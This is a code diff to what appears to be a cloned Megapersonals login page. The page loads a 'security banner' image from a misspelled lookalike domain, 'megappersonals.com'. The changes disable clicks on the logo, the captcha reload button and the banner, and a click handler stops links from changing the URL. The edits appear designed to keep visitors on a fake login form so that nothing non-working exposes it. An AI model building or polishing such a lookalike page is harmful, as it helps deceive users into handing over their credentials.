@@ -110,11 +110,26 @@
             padding: 0 !important;
             margin: 0 !important;
         }
+        /* Disable pointer events on non-functional elements */
+        .header-logo,
+        .starthere,
+        #captchaReload,
+        .security-banner {
+            pointer-events: none !important;
+            cursor: default !important;
+            user-select: none !important;
+        }
+        .header-logo a,
+        .starthere,
+        #captchaReload,
+        .security-banner a {
+            pointer-events: none !important;
+        }
     </style>
 </head>
 <body>
     <div class="container login-page">
-        <a href="#" onclick="return false;">
+        <a href="#" onclick="return false;" class="header-logo">
             <img src="assets/img/megapersonalsPageHeader.png" class="img-responsive center-block img-width-72 header-top-margin" alt="Megapersonals Header Logo">
         </a>
         <div class="centered top-margin-25 login_firsttime">
@@ -162,7 +177,7 @@
             </form>
         </div>
         <div class="centered" style="margin-top:36px;">
-            <a href="#" onclick="return false;"><img src="https://megappersonals.com/index_img/1111.png" alt="Megapersonals Security Banner"></a>
+            <a href="#" onclick="return false;" class="security-banner"><img src="https://megappersonals.com/index_img/1111.png" alt="Megapersonals Security Banner"></a>
         </div>
 
         <footer>
@@ -435,11 +450,22 @@
         }
 
         function setupClickSounds() {
+            // List of elements that should not be clickable
+            const disabledSelectors = ['.header-logo', '.starthere', '#captchaReload', '.security-banner'];
+            const isDisabled = (el) => disabledSelectors.some(selector => el.closest(selector));
+            
             document.body.addEventListener('click', (event) => {
                 const el = event.target;
                 if (!(el instanceof Element)) return;
                 const target = el.closest('a, button, input[type="submit"], input[type="button"]');
                 if (!target) return;
+                
+                // Prevent clicks on disabled elements
+                if (isDisabled(target)) {
+                    event.preventDefault();
+                    event.stopPropagation();
+                    return;
+                }
                 
                 // For all <a> tags, prevent default to ensure URL doesn't change
                 if (target.tagName.toLowerCase() === 'a') {
